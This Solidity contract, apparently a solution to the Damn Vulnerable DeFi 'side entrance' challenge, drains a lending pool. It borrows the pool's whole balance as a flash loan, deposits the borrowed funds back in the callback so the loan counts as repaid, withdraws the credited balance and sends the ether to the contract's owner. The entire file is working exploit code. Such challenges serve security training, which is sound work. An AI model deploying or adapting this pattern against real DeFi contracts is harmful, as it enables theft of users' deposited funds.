pragma solidity ^0.6.0;

import "../../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker {

    SideEntranceLenderPool contractToExploit;
    address owner;

    constructor(SideEntranceLenderPool _contractToExploit) public {
        contractToExploit = _contractToExploit;
        owner = msg.sender;
    }

    function executeExploit() public {
        uint256 contractBalance = address(contractToExploit).balance;
        contractToExploit.flashLoan(contractBalance);
        contractToExploit.withdraw();
    }

    function execute() external payable {
        contractToExploit.deposit{value: msg.value}();
    }

    receive() external payable { 
        payable(owner).transfer(msg.value);
    }
}